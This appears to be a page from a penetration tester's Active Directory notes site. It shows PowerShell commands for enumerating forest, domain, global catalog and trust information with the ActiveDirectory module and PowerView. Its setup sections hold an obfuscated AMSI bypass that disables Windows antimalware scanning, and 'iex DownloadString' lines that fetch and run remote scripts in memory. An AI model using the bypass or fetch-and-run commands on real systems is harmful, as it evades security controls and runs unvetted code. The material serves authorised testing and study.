---
title: "Domain Forest Mappings"
description: "Enumerating domain forest mappings."
lead: "Enumerating information about domain forest mappings using the ActiveDirectory PowerShell module and PowerView."
date: 2021-11-07T18:10:03+01:00
lastmod: 2021-11-07T18:10:03+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "domain_enumeration"
weight: 80
toc: true
---

## ActiveDirectory Module

### Setup

```powershell
# If computer has internet access
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory

# If computer has no internet access, download repository
Import-Module .\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose
Import-Module .\ADModule\ActiveDirectory\ActiveDirectory.psd1

# Check if module has been imported correctly
Get-Command -Module ActiveDirectory
```

### Commands

```powershell
# Get details about the current forest
Get-ADForest
Get-ADForest -Identity lab.local

# Get all domains in the current forest
(Get-ADForest).Domains

# Get all global catalogs for the current forest
Get-ADForest | Select -ExpandProperty GlobalCatalogs

# Map trusts of a forest
Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
```

## PowerView

### Setup

```powershell
# If it gets blocked by AMSI we can bypass it with
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# Then load the module
Import-Module .\PowerView.ps1
. .\PowerView.ps1

# With internet access
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')
```

### Commands

```powershell
# Get details about the current forest
Get-NetForest
Get-NetForest -Forest lab.local

# Get all domains in the current forest
Get-NetForestDomain
Get-NetForestDomain -Forest lab.local

# Get all global catalogs for the current forest
Get-NetForestCatalog
Get-NetForestCatalog -Forest lab.local

# Map trusts of a forest
Get-NetForestTrust
Get-NetForestTrust -Forest lab.local

# Map all trusts in current forest
Get-NetForestDomain |  Get-NetDomainTrust
```
